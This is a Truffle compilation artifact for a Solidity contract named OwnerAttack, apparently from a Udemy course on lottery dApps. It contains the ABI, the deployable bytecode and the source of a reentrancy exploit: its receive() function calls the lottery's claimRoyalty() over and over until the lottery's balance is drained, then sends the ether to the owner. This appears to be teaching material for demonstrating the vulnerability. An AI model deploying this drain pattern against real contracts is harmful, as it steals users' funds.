{
  "contractName": "OwnerAttack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_lotteryContractAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "lotteryContract",
      "outputs": [
        {
          "internalType": "contract ILottery",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [],
      "name": "bet",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x60a060405234801561001057600080fd5b506040516106d73803806106d78339818101604052810190610032919061010f565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1681525050336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061013c565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100dc826100b1565b9050919050565b6100ec816100d1565b81146100f757600080fd5b50565b600081519050610109816100e3565b92915050565b600060208284031215610125576101246100ac565b5b6000610133848285016100fa565b91505092915050565b60805161056661017160003960008181604001528181607d0152818161023e0152818161034f01526103d101526105666000f3fe6080604052600436106100385760003560e01c806311610c251461016f5780639e5faafc14610179578063b29c662a146101835761016a565b3661016a57347f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163110610100577f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663900e92c46040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100e357600080fd5b505af11580156100f7573d6000803e3d6000fd5b50505050610168565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610166573d6000803e3d6000fd5b505b005b600080fd5b6101776101ae565b005b6101816102bf565b005b34801561018f57600080fd5b506101986103cf565b6040516101a59190610472565b60405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461023c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161023390610510565b60405180910390fd5b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166311610c25346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156102a457600080fd5b505af11580156102b8573d6000803e3d6000fd5b5050505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461034d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161034490610510565b60405180910390fd5b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663900e92c46040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156103b557600080fd5b505af11580156103c9573d6000803e3d6000fd5b50505050565b7f000000000000000000000000000000000000000000000000000000000000000081565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061043861043361042e846103f3565b610413565b6103f3565b9050919050565b600061044a8261041d565b9050919050565b600061045c8261043f565b9050919050565b61046c81610451565b82525050565b60006020820190506104876000830184610463565b92915050565b600082825260208201905092915050565b7f41747461636b204f6e6c79206f776e65722063616e20706572666f726d20746860008201527f697320616374696f6e0000000000000000000000000000000000000000000000602082015250565b60006104fa60298361048d565b91506105058261049e565b604082019050919050565b60006020820190508181036000830152610529816104ed565b905091905056fea26469706673582212201f96365d410d9f151fdcfe2b7960870525dafb23912c8ee88da1342698653e4364736f6c63430008110033",
  "immutableReferences": {
    "10282": [
      {
        "length": 32,
        "start": 64
      },
      {
        "length": 32,
        "start": 125
      },
      {
        "length": 32,
        "start": 574
      },
      {
        "length": 32,
        "start": 847
      },
      {
        "length": 32,
        "start": 977
      }
    ]
  },
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n// import \"@ganache/console.log/console.sol\";\n\n\ninterface ILottery {\n    function bet() external payable;\n    function claimPrize(uint _week) external;\n    function claimRoyalty() external;\n}\n\ncontract OwnerAttack {\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Attack Only owner can perform this action\");\n        _;\n    }\n  address owner;\n  ILottery public immutable lotteryContract;\n\n  constructor(address _lotteryContractAddress) {\n    lotteryContract = ILottery(_lotteryContractAddress);\n    owner = msg.sender;\n  }\n\n  function bet() external payable onlyOwner {\n    lotteryContract.bet{value:msg.value}();\n  }\n\n  // function claimRoyalty() external onlyOwner {\n  //   lotteryContract.claimRoyalty();\n  // }\n\n  function attack() external payable onlyOwner {\n    lotteryContract.claimRoyalty();\n  }\n\n  receive() external payable {\n    if (address(lotteryContract).balance >= msg.value) {\n      lotteryContract.claimRoyalty();\n    } else {\n      payable(owner).transfer(address(this).balance);\n    }\n  }\n}\n\n\n\n\n",
  "sourcePath": "/home/alex/Dapp/udemy/lottery/lottery_truffle5/truffle-files/contracts/OwnerAttack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.17+commit.8df45f5f.Emscripten.clang"
  },
  "schemaVersion": "3.4.11",
  "updatedAt": "2023-04-14T20:22:55.686Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}